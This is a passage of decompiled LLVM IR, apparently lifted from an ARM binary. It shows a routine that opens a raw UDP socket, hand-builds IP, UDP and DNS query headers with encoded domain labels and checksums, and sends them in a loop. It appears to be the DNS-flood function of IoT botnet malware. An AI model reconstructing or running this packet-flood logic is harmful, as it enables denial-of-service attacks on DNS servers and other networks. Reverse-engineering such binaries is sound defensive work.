dec_label_pc_d82411:                              ; preds = %dec_label_pc_dc20
  unreachable

dec_label_pc_d824:                                ; preds = %dec_label_pc_dc88, %dec_label_pc_dc7c, %dec_label_pc_dc6c, %dec_label_pc_dc5c, %dec_label_pc_d7ec
  %v1_dc5849 = phi i32 [ %v1_dc24, %dec_label_pc_dc88 ], [ %v1_dc24, %dec_label_pc_dc7c ], [ %v1_dc24, %dec_label_pc_dc6c ], [ %v1_dc24, %dec_label_pc_dc5c ], [ %v1_d81c, %dec_label_pc_d7ec ]
  %v0_d824 = load i32, i32* @r7, align 4
  %v2_d824 = icmp eq i32 %v0_d824, 0
  store i1 %v2_d824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d824, label %dec_label_pc_dc4c, label %dec_label_pc_d82c

dec_label_pc_d82c:                                ; preds = %dec_label_pc_d824
  store i32 %v0_d824, i32* %r0.global-to-local, align 4
  %v1_d830 = inttoptr i32 %v0_d824 to i8*
  %v2_d830 = call i32 @function_12480(i8* %v1_d830)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_d830, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_d844 = call i32 @function_13940(i32 2, i32 3, i32 17)
  store i32 %v3_d844, i32* %r0.global-to-local, align 4
  %v7_d848 = icmp eq i32 %v3_d844, -1
  store i1 %v7_d848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d848, label %dec_label_pc_dc4c, label %dec_label_pc_d854

dec_label_pc_d854:                                ; preds = %dec_label_pc_d82c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d85c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d85c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d870 = call i32 @function_138fc(i32 %v3_d844, i32 0, i32 3, i32 %v6_d85c, i32 4)
  store i32 %v5_d870, i32* %r0.global-to-local, align 4
  %v7_d874 = icmp eq i32 %v5_d870, -1
  store i1 %v7_d874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d874, label %dec_label_pc_dc44, label %dec_label_pc_d87c

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d854
  %v0_d884 = load i32, i32* %sb.global-to-local, align 4
  %v1_d884 = urem i32 %v0_d884, 256
  store i32 %v1_d884, i32* %sb.global-to-local, align 4
  %v3_d88c = mul i32 %v6_d694, 65536
  store i32 %v3_d88c, i32* %r3.global-to-local, align 4
  %v5_d898 = trunc i32 %v0_d884 to i8
  %v0_d89c = load i32, i32* @r8, align 4
  %v2_d89c = icmp eq i32 %v0_d89c, 0
  store i1 %v2_d89c, i1* %cpsr_z.global-to-local, align 1
  %v3_d8a0 = urem i32 %v7_d638, 65536
  store i32 %v3_d8a0, i32* %r0.global-to-local, align 4
  %v3_d8a8 = urem i32 %v6_d694, 65536
  store i32 %v3_d8a8, i32* %r2.global-to-local, align 4
  %v3_d8ac = mul i32 %v6_d6ac, 65536
  %v3_d8b0 = mul i32 %v6_d6c8, 65536
  store i32 %v3_d8b0, i32* %ip.global-to-local, align 4
  br i1 %v2_d89c, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_d87c
  %v5_d8b8 = sext i8 %v5_d898 to i32
  store i32 %v5_d8b8, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_d87c, %bb104
  %v2_d8e4 = phi i32 [ %v3_d8a8, %dec_label_pc_d87c ], [ %v5_d8b8, %bb104 ]
  %v3_d8c4 = urem i32 %v6_d6ac, 65536
  store i32 %v3_d8c4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_d8cc = urem i32 %v6_d6c8, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_d8e4 = load i32, i32* @r6, align 4
  br i1 %v2_d89c, label %.dec_label_pc_dacc.preheader_crit_edge, label %dec_label_pc_d8ec

.dec_label_pc_dacc.preheader_crit_edge:           ; preds = %bb105
  %v3_d8e4 = add i32 %v1_d8e4, %v2_d8e4
  store i32 %v3_d8e4, i32* @r7, align 4
  %.pre = sext i8 %v5_d898 to i32
  br label %dec_label_pc_dacc.preheader

dec_label_pc_d8ec:                                ; preds = %bb105
  %v2_d8ec = add i32 %v1_d8e4, %v1_d884
  %v3_d8f0 = mul i32 %v2_d8ec, 65536
  %v1_d8f8 = add i32 %v3_d8f0, 1769472
  %v1_d8fc = add i32 %v3_d8f0, 3080192
  %tmp106 = udiv i32 %v1_d8fc, 256
  %v3_d910 = and i32 %tmp106, 65280
  %v4_d920 = udiv i32 %v1_d8fc, 16777216
  %v5_d920 = or i32 %v3_d910, %v4_d920
  store i32 %v5_d920, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_d694 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_d638, 256
  %v3_d934 = and i32 %tmp107, 65280
  store i32 %v3_d934, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_d638, 256
  %v4_d938 = urem i32 %tmp108, 256
  %v5_d938 = or i32 %v4_d938, %v3_d934
  store i32 %v5_d938, i32* @sb, align 4
  store i32 %v3_d8b0, i32* %r2.global-to-local, align 4
  store i32 %v3_d8ac, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_d6ac, 256
  %v3_d94c = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_d6c8, 256
  %v3_d950 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_d8f8, 256
  %v3_d954 = and i32 %tmp111, 65280
  store i32 %v3_d954, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_d6ac, 256
  %v4_d958 = urem i32 %tmp112, 256
  %v5_d958 = or i32 %v4_d958, %v3_d94c
  store i32 %v5_d958, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_d6c8, 256
  %v4_d95c = urem i32 %tmp113, 256
  %v5_d95c = or i32 %v4_d95c, %v3_d950
  store i32 %v5_d95c, i32* @r4, align 4
  %v1_d960 = add i32 %v1_d8e4, 1
  store i32 %v1_d960, i32* %r3.global-to-local, align 4
  %v4_d964 = udiv i32 %v1_d8f8, 16777216
  %v5_d964 = or i32 %v4_d964, %tmp111
  store i32 0, i32* @r5, align 4
  %sext = mul i32 %v6_d614, 16777216
  %v4_d9bc = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v6_d650, 16777216
  %v4_d9c8 = sdiv i32 %sext8, 16777216
  %v4_d9e8 = sext i8 %v5_d898 to i32
  %sext9 = mul nuw i32 %v5_d958, 65536
  %v7_d9fc = sdiv i32 %sext9, 65536
  %sext10 = mul nuw i32 %v5_d95c, 65536
  %v4_da24 = sdiv i32 %sext10, 65536
  %v1_d9c4 = trunc i32 %v4_d9bc to i8
  %extract.t = trunc i32 %v4_d9c8 to i8
  %v1_d9ec = add nsw i32 %v4_d9e8, 41
  %sext120 = mul i32 %v5_d964, 65536
  %v3_d9fc = sdiv i32 %sext120, 65536
  br label %dec_label_pc_d97c

dec_label_pc_d97c:                                ; preds = %dec_label_pc_da9c, %dec_label_pc_d8ec
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_d984 = call i32 @function_144a8(i32 600, i32 1)
  store i32 %v2_d984, i32* %r0.global-to-local, align 4
  store i32 %v2_d5fc, i32* %ip.global-to-local, align 4
  %v3_d98c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d98c, i32* %r3.global-to-local, align 4
  %v2_d990 = load i32, i32* @r5, align 4
  %v5_d990 = mul i32 %v2_d990, 4
  %v6_d990 = add i32 %v5_d990, %v2_d5fc
  %v7_d990 = inttoptr i32 %v6_d990 to i32*
  store i32 %v2_d984, i32* %v7_d990, align 4
  %v0_d994 = load i32, i32* %ip.global-to-local, align 4
  %v1_d994 = load i32, i32* %r3.global-to-local, align 4
  %v4_d994 = mul i32 %v1_d994, 4
  %v5_d994 = add i32 %v4_d994, %v0_d994
  %v6_d994 = inttoptr i32 %v5_d994 to i32*
  %v7_d994 = load i32, i32* %v6_d994, align 4
  store i32 %v7_d994, i32* %r1.global-to-local, align 4
  %v1_d998 = inttoptr i32 %v7_d994 to i8*
  %v2_d998 = load i8, i8* %v1_d998, align 1
  %tmp127 = urem i8 %v2_d998, 16
  %v1_d99c = zext i8 %tmp127 to i32
  %v1_d9a0 = or i32 %v1_d99c, 64
  store i32 %v1_d9a0, i32* %r2.global-to-local, align 4
  %v1_d9a4 = trunc i32 %v1_d9a0 to i8
  store i8 %v1_d9a4, i8* %v1_d998, align 1
  %v0_d9a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_d9a8 = inttoptr i32 %v0_d9a8 to i8*
  %v2_d9a8 = load i8, i8* %v1_d9a8, align 1
  %v3_d9a8 = zext i8 %v2_d9a8 to i32
  %v1_d9ac = and i32 %v3_d9a8, 240
  %v1_d9b0 = or i32 %v1_d9ac, 5
  store i32 %v1_d9b0, i32* %r3.global-to-local, align 4
  store i32 %v1_d67c, i32* %lr.global-to-local, align 4
  %v1_d9b8 = trunc i32 %v1_d9b0 to i8
  store i8 %v1_d9b8, i8* %v1_d9a8, align 1
  store i32 %v4_d9bc, i32* %r0.global-to-local, align 4
  %v0_d9c0 = load i32, i32* %lr.global-to-local, align 4
  %v2_d9c0 = icmp eq i32 %v0_d9c0, 0
  store i1 %v2_d9c0, i1* %cpsr_z.global-to-local, align 1
  %v2_d9c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_d9c4 = add i32 %v2_d9c4, 1
  %v4_d9c4 = inttoptr i32 %v3_d9c4 to i8*
  store i8 %v1_d9c4, i8* %v4_d9c4, align 1
  store i32 %v4_d9c8, i32* %r2.global-to-local, align 4
  %v0_d9cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d9cc, label %.thread13, label %bb114

bb114:                                            ; preds = %dec_label_pc_d97c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d9d0 = load i32, i32* %r1.global-to-local, align 4
  %v4_d9d0 = add i32 %v3_d9d0, 6
  %v5_d9d0 = inttoptr i32 %v4_d9d0 to i16*
  store i16 64, i16* %v5_d9d0, align 2
  %v0_d9d8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_d9d8.pre to i8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_d97c, %bb114
  %v0_d9d8.off0 = phi i8 [ %extract.t, %dec_label_pc_d97c ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_d9d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_d9d8 = add i32 %v2_d9d8, 8
  %v4_d9d8 = inttoptr i32 %v3_d9d8 to i8*
  store i8 %v0_d9d8.off0, i8* %v4_d9d8, align 1
  %v0_d9dc = load i32, i32* %r3.global-to-local, align 4
  %v1_d9dc = trunc i32 %v0_d9dc to i8
  %v2_d9dc = load i32, i32* %r1.global-to-local, align 4
  %v3_d9dc = add i32 %v2_d9dc, 9
  %v4_d9dc = inttoptr i32 %v3_d9dc to i8*
  store i8 %v1_d9dc, i8* %v4_d9dc, align 1
  %v2_d9e4 = load i32, i32* @global_var_23394.88, align 4
  %v0_d9ec = load i32, i32* %r1.global-to-local, align 4
  %v2_d9f0 = add i32 %v1_d9ec, %v0_d9ec
  store i32 %v2_d9f0, i32* @r4, align 4
  %v2_d9f4 = add i32 %v0_d9ec, 12
  %v3_d9f4 = inttoptr i32 %v2_d9f4 to i32*
  store i32 %v2_d9e4, i32* %v3_d9f4, align 4
  store i32 %v3_d9fc, i32* %r2.global-to-local, align 4
  store i32 %v7_d9fc, i32* %r3.global-to-local, align 4
  %v0_da00 = load i32, i32* %r1.global-to-local, align 4
  %v1_da00 = add i32 %v0_da00, 20
  store i32 %v1_da00, i32* %ip.global-to-local, align 4
  %v0_da04 = load i32, i32* @sl, align 4
  %v1_da04 = trunc i32 %v0_da04 to i16
  %v3_da04 = add i32 %v0_da00, 2
  %v4_da04 = inttoptr i32 %v3_da04 to i16*
  store i16 %v1_da04, i16* %v4_da04, align 2
  %v0_da08 = load i32, i32* @sb, align 4
  %v1_da08 = trunc i32 %v0_da08 to i16
  %v2_da08 = load i32, i32* %r1.global-to-local, align 4
  %v3_da08 = add i32 %v2_da08, 4
  %v4_da08 = inttoptr i32 %v3_da08 to i16*
  store i16 %v1_da08, i16* %v4_da08, align 2
  %v0_da0c = load i32, i32* %r2.global-to-local, align 4
  %v1_da0c = trunc i32 %v0_da0c to i16
  %v2_da0c = load i32, i32* %ip.global-to-local, align 4
  %v3_da0c = add i32 %v2_da0c, 4
  %v4_da0c = inttoptr i32 %v3_da0c to i16*
  store i16 %v1_da0c, i16* %v4_da0c, align 2
  %v0_da10 = load i32, i32* %r3.global-to-local, align 4
  %v1_da10 = trunc i32 %v0_da10 to i16
  %v2_da10 = load i32, i32* %ip.global-to-local, align 4
  %v3_da10 = add i32 %v2_da10, 2
  %v4_da10 = inttoptr i32 %v3_da10 to i16*
  store i16 %v1_da10, i16* %v4_da10, align 2
  %v2_da18 = load i32, i32* %r1.global-to-local, align 4
  %v3_da18 = add i32 %v2_da18, 20
  %v4_da18 = inttoptr i32 %v3_da18 to i16*
  store i16 %rev, i16* %v4_da18, align 2
  store i32 %v4_d9e8, i32* %ip.global-to-local, align 4
  %v0_da20 = load i32, i32* %r1.global-to-local, align 4
  %v1_da20 = add i32 %v0_da20, 28
  store i32 %v1_da20, i32* %r0.global-to-local, align 4
  store i32 %v4_da24, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_da30 = add i32 %v0_da20, 30
  %v4_da30 = inttoptr i32 %v3_da30 to i16*
  store i16 1, i16* %v4_da30, align 2
  %v0_da34 = load i32, i32* @lr, align 4
  %v1_da34 = trunc i32 %v0_da34 to i16
  %v2_da34 = load i32, i32* %r0.global-to-local, align 4
  %v3_da34 = add i32 %v2_da34, 4
  %v4_da34 = inttoptr i32 %v3_da34 to i16*
  store i16 %v1_da34, i16* %v4_da34, align 2
  %v0_da38 = load i32, i32* %ip.global-to-local, align 4
  %v1_da38 = trunc i32 %v0_da38 to i8
  %v2_da38 = load i32, i32* %r1.global-to-local, align 4
  %v3_da38 = add i32 %v2_da38, 40
  %v4_da38 = inttoptr i32 %v3_da38 to i8*
  store i8 %v1_da38, i8* %v4_da38, align 1
  %v0_da3c = load i32, i32* @fp, align 4
  %v1_da3c = load i32, i32* %r1.global-to-local, align 4
  %v2_da3c = add i32 %v1_da3c, 16
  %v3_da3c = inttoptr i32 %v2_da3c to i32*
  store i32 %v0_da3c, i32* %v3_da3c, align 4
  %v0_da40 = load i32, i32* %r3.global-to-local, align 4
  %v1_da40 = trunc i32 %v0_da40 to i16
  %v2_da40 = load i32, i32* %r1.global-to-local, align 4
  %v3_da40 = add i32 %v2_da40, 28
  %v4_da40 = inttoptr i32 %v3_da40 to i16*
  store i16 %v1_da40, i16* %v4_da40, align 2
  %v0_da44 = load i32, i32* @r4, align 4
  %v1_da44 = add i32 %v0_da44, 1
  store i32 %v1_da44, i32* %r0.global-to-local, align 4
  %v0_da48 = load i32, i32* @r7, align 4
  store i32 %v0_da48, i32* %r1.global-to-local, align 4
  store i32 %v1_d960, i32* %r2.global-to-local, align 4
  %v3_da50 = call i32 @function_124f0(i32 %v1_da44, i32 %v0_da48, i32 %v1_d960)
  store i32 %v3_da50, i32* %r0.global-to-local, align 4
  %v0_da54 = load i32, i32* @r6, align 4
  %v2_da54 = icmp eq i32 %v0_da54, 0
  store i1 %v2_da54, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_da54, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_da64

bb116:                                            ; preds = %.thread13
  %v5_da58 = load i32, i32* @r4, align 4
  store i32 %v5_da58, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_da9c

dec_label_pc_da64:                                ; preds = %.thread13
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_da68 = load i32, i32* @r4, align 4
  store i32 %v0_da68, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_da70

dec_label_pc_da70:                                ; preds = %.thread20, %dec_label_pc_da64
  %v0_da7c = phi i32 [ %storemerge, %.thread20 ], [ 0, %dec_label_pc_da64 ]
  %v0_da80 = phi i32 [ %v0_da94, %.thread20 ], [ 0, %dec_label_pc_da64 ]
  %v1_da70 = load i32, i32* @r7, align 4
  %v2_da70 = add i32 %v1_da70, %v0_da80
  %v3_da70 = inttoptr i32 %v2_da70 to i8*
  %v4_da70 = load i8, i8* %v3_da70, align 1
  %v6_da70 = zext i8 %v4_da70 to i32
  store i32 %v6_da70, i32* %r3.global-to-local, align 4
  %v7_da74 = icmp eq i8 %v4_da70, 46
  store i1 %v7_da74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_da74, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_da70
  %v1_da7c16 = add nsw i32 %v0_da7c, 1
  store i32 %v1_da7c16, i32* %r2.global-to-local, align 4
  %v1_da8018 = add i32 %v0_da80, 1
  store i32 %v1_da8018, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_da70
  %v2_da78 = load i32, i32* @r4, align 4
  %v3_da78 = add i32 %v2_da78, %v0_da80
  store i32 %v3_da78, i32* %r3.global-to-local, align 4
  %v1_da7c = add nsw i32 %v0_da7c, 1
  store i32 %v1_da7c, i32* %r2.global-to-local, align 4
  %v1_da80 = add i32 %v0_da80, 1
  store i32 %v1_da80, i32* %r1.global-to-local, align 4
  %v2_da84 = trunc i32 %v0_da7c to i8
  %v3_da84 = load i32, i32* %r0.global-to-local, align 4
  %v4_da84 = inttoptr i32 %v3_da84 to i8*
  store i8 %v2_da84, i8* %v4_da84, align 1
  %v0_da88.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da88.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_da88.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_da88 = phi i32 [ %v1_da88.pre, %bb117.bb118_crit_edge ], [ %v1_da7c16, %.thread59 ]
  %v2_da88 = urem i32 %v1_da88, 256
  br label %.thread20

bb119:                                            ; preds = %bb117
  %v1_da8c = load i32, i32* %r3.global-to-local, align 4
  %v2_da8c = add i32 %v1_da8c, 1
  store i32 %v2_da8c, i32* %r0.global-to-local, align 4
  br label %.thread20

.thread20:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_da88, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_da94 = load i32, i32* %r1.global-to-local, align 4
  %v1_da94 = load i32, i32* @r6, align 4
  %v9_da94 = icmp eq i32 %v0_da94, %v1_da94
  store i1 %v9_da94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_da94, label %dec_label_pc_da9c.loopexit, label %dec_label_pc_da70

dec_label_pc_da9c.loopexit:                       ; preds = %.thread20
  %v2_da9c.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_da9c

dec_label_pc_da9c:                                ; preds = %bb116, %dec_label_pc_da9c.loopexit
  %v0_da9c.off0 = phi i8 [ %extract.t126, %dec_label_pc_da9c.loopexit ], [ 0, %bb116 ]
  %v2_da9c = phi i32 [ %v2_da9c.pre, %dec_label_pc_da9c.loopexit ], [ %v5_da58, %bb116 ]
  %v3_da9c = inttoptr i32 %v2_da9c to i8*
  store i8 %v0_da9c.off0, i8* %v3_da9c, align 1
  %v3_daa0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_daa0, i32* %r3.global-to-local, align 4
  %v1_daa4 = add i32 %v3_daa0, 1
  store i32 %v1_daa4, i32* @r5, align 4
  %v0_daa8 = load i32, i32* @r4, align 4
  %v1_daa8 = load i32, i32* @r6, align 4
  %v2_daa8 = add i32 %v1_daa8, %v0_daa8
  store i32 %v2_daa8, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_dab0 = load i32, i32* @r8, align 4
  %v9_dab0 = icmp eq i32 %v0_dab0, %v1_daa4
  store i1 %v9_dab0, i1* %cpsr_z.global-to-local, align 1
  %v3_dab4 = add i32 %v2_daa8, 4
  %v4_dab4 = inttoptr i32 %v3_dab4 to i16*
  store i16 256, i16* %v4_dab4, align 2
  %v0_dab8 = load i32, i32* @lr, align 4
  %v1_dab8 = trunc i32 %v0_dab8 to i16
  %v2_dab8 = load i32, i32* %r2.global-to-local, align 4
  %v3_dab8 = add i32 %v2_dab8, 2
  %v4_dab8 = inttoptr i32 %v3_dab8 to i16*
  store i16 %v1_dab8, i16* %v4_dab8, align 2
  %v0_dabc = load i32, i32* @r5, align 4
  store i32 %v0_dabc, i32* %stack_var_-44, align 4
  %v8_dac0 = icmp sgt i32 %v0_dab0, %v1_daa4
  br i1 %v8_dac0, label %dec_label_pc_d97c, label %dec_label_pc_dac4

dec_label_pc_dac4:                                ; preds = %dec_label_pc_da9c
  store i32 %v4_d9e8, i32* %r0.global-to-local, align 4
  %v0_dac8 = load i32, i32* @r6, align 4
  %v2_dac8 = add i32 %v0_dac8, %v4_d9e8
  store i32 %v2_dac8, i32* @r7, align 4
  %v0_dad0.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_dacc.preheader

dec_label_pc_dacc.preheader:                      ; preds = %.dec_label_pc_dacc.preheader_crit_edge, %dec_label_pc_dac4
  %v4_db30.pre-phi = phi i32 [ %.pre, %.dec_label_pc_dacc.preheader_crit_edge ], [ %v4_d9e8, %dec_label_pc_dac4 ]
  %v0_dad0.pre = phi i32 [ 0, %.dec_label_pc_dacc.preheader_crit_edge ], [ %v0_dad0.pre.pre, %dec_label_pc_dac4 ]
  %v3_dafc = icmp eq i32 %v3_d8a0, 65535
  %v3_db0c = icmp eq i32 %v3_d8a8, 65535
  br label %dec_label_pc_dacc

dec_label_pc_dacc:                                ; preds = %dec_label_pc_dacc, %dec_label_pc_dbc4, %dec_label_pc_dacc.preheader
  %v0_dad0 = phi i32 [ %v0_dad0.pre, %dec_label_pc_dacc.preheader ], [ 0, %dec_label_pc_dbc4 ], [ 0, %dec_label_pc_dacc ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_dad0 = icmp eq i32 %v0_dad0, 0
  store i1 %v2_dad0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_dad0, label %dec_label_pc_dacc, label %dec_label_pc_dadc

dec_label_pc_dadc:                                ; preds = %dec_label_pc_dacc, %dec_label_pc_dbc4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_dae0 = load i32, i32* @r7, align 4
  %v1_dae0 = add i32 %v0_dae0, 27
  store i32 %v1_dae0, i32* @sb, align 4
  %v1_dae4 = add i32 %v0_dae0, 47
  store i32 %v1_dae4, i32* @sl, align 4
  br label %dec_label_pc_dae8

dec_label_pc_dae8:                                ; preds = %dec_label_pc_db2c, %dec_label_pc_dadc
  %v1_daf4 = phi i32 [ %v1_dbb4, %dec_label_pc_db2c ], [ 0, %dec_label_pc_dadc ]
  store i32 %v2_d5fc, i32* @r3, align 4
  store i32 %v3_d8a0, i32* @ip, align 4
  %v4_daf4 = mul i32 %v1_daf4, 4
  %v5_daf4 = add i32 %v4_daf4, %v2_d5fc
  %v6_daf4 = inttoptr i32 %v5_daf4 to i32*
  %v7_daf4 = load i32, i32* %v6_daf4, align 4
  store i32 %v7_daf4, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_dafc, i1* %cpsr_z.global-to-local, align 1
  %v1_db00 = add i32 %v7_daf4, 20
  store i32 %v1_db00, i32* @r6, align 4
  br i1 %v3_dafc, label %dec_label_pc_dbd8, label %dec_label_pc_db08

dec_label_pc_db08:                                ; preds = %dec_label_pc_dae8
  store i32 %v3_d8a8, i32* @lr, align 4
  store i1 %v3_db0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_db0c, label %dec_label_pc_dbec, label %dec_label_pc_db14

dec_label_pc_db14:                                ; preds = %dec_label_pc_dbd8.dec_label_pc_db14_crit_edge, %dec_label_pc_db08
  %v1_db18 = phi i32 [ %v1_db18.pre, %dec_label_pc_dbd8.dec_label_pc_db14_crit_edge ], [ 65535, %dec_label_pc_db08 ]
  store i32 %v3_d8c4, i32* %r0.global-to-local, align 4
  %v9_db18 = icmp eq i32 %v3_d8c4, %v1_db18
  store i1 %v9_db18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db18, label %dec_label_pc_dc00, label %dec_label_pc_db20

dec_label_pc_db20:                                ; preds = %dec_label_pc_dbec, %dec_label_pc_db14
  %v1_db24 = phi i32 [ %v1_dbf8, %dec_label_pc_dbec ], [ %v1_db18, %dec_label_pc_db14 ]
  store i32 %v3_d8cc, i32* %r2.global-to-local, align 4
  %v9_db24 = icmp eq i32 %v3_d8cc, %v1_db24
  store i1 %v9_db24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db24, label %dec_label_pc_dc14, label %dec_label_pc_db2c

dec_label_pc_db2c:                                ; preds = %dec_label_pc_dc00, %dec_label_pc_db20, %dec_label_pc_dc14
  %v0_db2c = load i32, i32* @r4, align 4
  %v1_db2c = add i32 %v0_db2c, 41
  store i32 %v1_db2c, i32* %r0.global-to-local, align 4
  store i32 %v4_db30.pre-phi, i32* %r1.global-to-local, align 4
  %v2_db34 = inttoptr i32 %v1_db2c to i8*
  %v3_db34 = call i32 @function_f7c4(i8* %v2_db34, i32 %v4_db30.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_db3c = load i32, i32* @r4, align 4
  %v3_db3c = add i32 %v2_db3c, 10
  %v4_db3c = inttoptr i32 %v3_db3c to i16*
  store i16 0, i16* %v4_db3c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_db44 = load i32, i32* @r4, align 4
  store i32 %v0_db44, i32* @r0, align 4
  %v2_db48 = call i32 @function_dc98(i32 %v0_db44, i32 20)
  %v3_db48 = trunc i32 %v2_db48 to i16
  store i32 %v2_db48, i32* %r0.global-to-local, align 4
  %v3_db4c = load i32, i32* @r4, align 4
  %v4_db4c = add i32 %v3_db4c, 10
  %v5_db4c = inttoptr i32 %v4_db4c to i16*
  store i16 %v3_db48, i16* %v5_db4c, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_db54 = load i32, i32* @r6, align 4
  %v3_db54 = add i32 %v2_db54, 6
  %v4_db54 = inttoptr i32 %v3_db54 to i16*
  store i16 0, i16* %v4_db54, align 2
  %v0_db58 = load i32, i32* @r6, align 4
  store i32 %v0_db58, i32* @r1, align 4
  %v1_db5c = add i32 %v0_db58, 4
  %v2_db5c = inttoptr i32 %v1_db5c to i16*
  %v3_db5c = load i16, i16* %v2_db5c, align 2
  %v4_db5c = zext i16 %v3_db5c to i32
  store i32 %v4_db5c, i32* %r2.global-to-local, align 4
  %v0_db60 = load i32, i32* @sb, align 4
  store i32 %v0_db60, i32* %r3.global-to-local, align 4
  %v0_db64 = load i32, i32* @r4, align 4
  store i32 %v0_db64, i32* %r0.global-to-local, align 4
  %v4_db68 = call i32 @function_dce8(i32 %v0_db64, i32 %v0_db58, i32 %v4_db5c, i32 %v0_db60)
  %v5_db68 = trunc i32 %v4_db68 to i16
  store i32 %v4_db68, i32* %r0.global-to-local, align 4
  %v3_db6c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_db6c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_db74 = mul i32 %v3_db6c, 32
  store i32 %v3_db74, i32* %ip.global-to-local, align 4
  %v3_db78 = load i32, i32* @r6, align 4
  %v4_db78 = add i32 %v3_db78, 6
  %v5_db78 = inttoptr i32 %v4_db78 to i16*
  store i16 %v5_db68, i16* %v5_db78, align 2
  %v0_db7c = load i32, i32* %ip.global-to-local, align 4
  %v1_db7c = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_db7c, -8
  %v5_db7c = add i32 %v0_db7c, %tmp128
  store i32 %v5_db7c, i32* %ip.global-to-local, align 4
  %v0_db80 = load i32, i32* @r6, align 4
  %v1_db80 = add i32 %v0_db80, 2
  %v2_db80 = inttoptr i32 %v1_db80 to i16*
  %v3_db80 = load i16, i16* %v2_db80, align 2
  %v1_db84 = load i32, i32* @lr, align 4
  %v2_db84 = add i32 %v1_db84, %v5_db7c
  store i32 %v2_db84, i32* %ip.global-to-local, align 4
  %v3_db88 = add i32 %v2_db84, 2
  %v4_db88 = inttoptr i32 %v3_db88 to i16*
  store i16 %v3_db80, i16* %v4_db88, align 2
  %v0_db8c = load i32, i32* @fp, align 4
  %v1_db8c = load i32, i32* %ip.global-to-local, align 4
  %v2_db8c = add i32 %v1_db8c, 4
  %v3_db8c = inttoptr i32 %v2_db8c to i32*
  store i32 %v0_db8c, i32* %v3_db8c, align 4
  %v0_db90 = load i32, i32* @r4, align 4
  store i32 %v0_db90, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_d844, i32* %r0.global-to-local, align 4
  %v0_db9c = load i32, i32* @sl, align 4
  store i32 %v0_db9c, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
